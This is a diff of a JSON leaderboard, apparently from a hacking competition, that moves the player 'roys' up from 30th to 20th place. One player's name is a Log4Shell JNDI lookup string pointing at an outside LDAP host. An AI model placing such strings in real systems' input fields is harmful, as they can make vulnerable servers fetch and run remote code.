@@ -115,68 +115,68 @@
     },
     {
         "position": 20,
+        "user_id": "66e79d0ba2d05f40e2bed10594696230",
+        "name": "roys",
+        "points": 177
+    },
+    {
+        "position": 21,
         "user_id": "caf18f63407f8c5bcd6c0ae2a7cdca32",
         "name": "KOKETT KODEKNEKKER",
         "points": 176
     },
     {
-        "position": 21,
+        "position": 22,
         "user_id": "3f179c20a1d1842eac4bc088449a3c60",
         "name": "halvis",
         "points": 175
     },
     {
-        "position": 22,
+        "position": 23,
         "user_id": "229b46473311a42d28dfbf88198265da",
         "name": "KUL GEEK",
         "points": 170
     },
     {
-        "position": 23,
+        "position": 24,
         "user_id": "33950f41dd034b59bb51b1adb277d79b",
         "name": "INNBITT REVERSER",
         "points": 170
     },
     {
-        "position": 24,
+        "position": 25,
         "user_id": "e14eb0b91b5069b7064c23cb1a5d96a0",
         "name": "Roellik",
         "points": 166
     },
     {
-        "position": 25,
+        "position": 26,
         "user_id": "1bf8e2a5210e0ee0e92ec0d7bec755cb",
         "name": "langemyh",
         "points": 165
     },
     {
-        "position": 26,
+        "position": 27,
         "user_id": "93fa4c8b8341dacd7565b0a073b3d0f9",
         "name": "thronic",
         "points": 160
     },
     {
-        "position": 27,
+        "position": 28,
         "user_id": "72c1cc6250a04e68e141585023a3e41e",
         "name": "${jndi:ldap://anvilshop.utl/x}",
         "points": 160
     },
     {
-        "position": 28,
+        "position": 29,
         "user_id": "2a3c4718d2588ddd005eab90ba1fd351",
         "name": "FLINK BABBAGE",
         "points": 159
     },
     {
-        "position": 29,
+        "position": 30,
         "user_id": "62190e3b89569a69b6fef71468254069",
         "name": "SVAK AGENT",
-        "points": 152
-    },
-    {
-        "position": 30,
-        "user_id": "66e79d0ba2d05f40e2bed10594696230",
-        "name": "roys",
         "points": 152
     },
     {
